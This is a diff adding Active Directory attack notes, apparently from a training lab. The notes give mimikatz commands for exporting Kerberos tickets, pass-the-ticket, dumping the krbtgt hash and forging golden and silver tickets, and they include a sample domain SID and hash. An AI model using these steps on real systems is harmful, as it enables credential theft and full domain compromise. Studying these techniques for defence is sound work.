@@ -70,6 +70,41 @@ hashcat -m 18200 -a 0 admin2-hash.txt Pass.txt
 
 ## Pass the Ticket w/ mimikatz
 
+```bash
+mimikatz.exe  # Run mimikatz
+privilege::debug  # Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
+sekurlsa::tickets /export  # this will export all of the .kirbi tickets into the directory that you are currently in
+```
+
+When looking for which ticket to impersonate I would recommend looking for an administrator ticket from the krbtgt just like: `[0;52151]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi`
+
+Now that we have our ticket ready we can now perform a pass the ticket attack to gain domain admin privileges.
+
+```bash
+# From Mimikatz
+kerberos::ptt <ticket>  # Syntax
+kerberos::ptt [0;52151]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
+# From regular terminal
+klist  # Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.
+dir \\10.10.137.54\admin$  # Verify by checking admin share
+```
+
 ## Golden/Silver Ticket Attacks w/ mimikatz
 
-## Kerberos Backdoors w/mimikatz
+```bash
+mimikatz.exe
+privilege::debug
+lsadump::lsa /inject /name:krbtgt  # This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.
+# Create a Golden/Silver Ticket
+Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:  # syntax
+Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500
+# Use the Golden/Silver Ticket to access other machines
+misc::cmd  # this will open a new elevated command prompt with the given ticket in mimikatz.
+```
+
+Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.
+
+```bash
+lsadump::lsa /inject /name:sqlservice # Get the SQLService NTLM Hash 
+lsadump::lsa /inject /name:Administrator  # Get the Administrator NTLM Hash
+```
